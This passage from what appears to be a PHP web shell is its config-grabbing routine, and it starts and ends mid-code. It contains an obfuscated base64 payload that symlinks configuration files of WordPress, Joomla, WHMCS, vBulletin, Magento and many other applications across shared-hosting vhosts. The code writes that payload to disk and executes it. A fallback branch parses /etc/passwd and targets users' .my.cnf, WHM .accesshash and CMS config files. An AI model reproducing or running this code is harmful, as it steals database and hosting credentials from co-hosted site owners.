cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXNob3BwaW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNhbGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXJzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictbWVtYmVycy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlczEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJHNpdGVzcy4nLWZvcnVtLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW1zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmYucGhwJywkc2l0ZXNzLictNS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictNC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvV1Avd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dvcmRwcmVzcy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1uZXdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ldy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLW5ldy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9nL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmxvZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLWJsb2dzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLVdvcmRwcmVzcy1ob21lLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3Mtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHNpdGVzcy4nLURydXBhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5ncy50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3JlcXVpcmVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1BTTRTUy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICJMb2NhdGlvbjogLi9cblxuIjs=";
		$file = "btm_conf/vhost.cin";
		$handle = fopen($file ,"w+");
		fwrite($handle ,base64_decode($vhost));
		fclose($handle);
		chmod($file, 0755);
		if(exe("cd btm_conf && ./vhost.cin")) {
			echo "<center><a href='$link_config/btm_conf'><font color=lime>Done</font></a></center>";
		} else {
			echo "<center><a href='$link_config/btm_conf/vhost.cin'><font color=lime>Done</font></a></center>";
		}

	} else {
		$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
		while($passwd = fgets($etc)) {
			if($passwd == "" || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_config);
				foreach($user_config[1] as $user_idx) {
					$user_config_dir = "/home/$user_idx/public_html/";
					if(is_readable($user_config_dir)) {
						$grab_config = array(
							"/home/$user_idx/.my.cnf" => "cpanel",
							"/home/$user_idx/.accesshash" => "WHM-accesshash",
							"$user_config_dir/po-content/config.php" => "Popoji",
							"$user_config_dir/vdo_config.php" => "Voodoo",
							"$user_config_dir/bw-configs/config.ini" => "BosWeb",
							"$user_config_dir/config/koneksi.php" => "Lokomedia",
							"$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
							"$user_config_dir/clientarea/configuration.php" => "WHMCS",
							"$user_config_dir/whm/configuration.php" => "WHMCS",
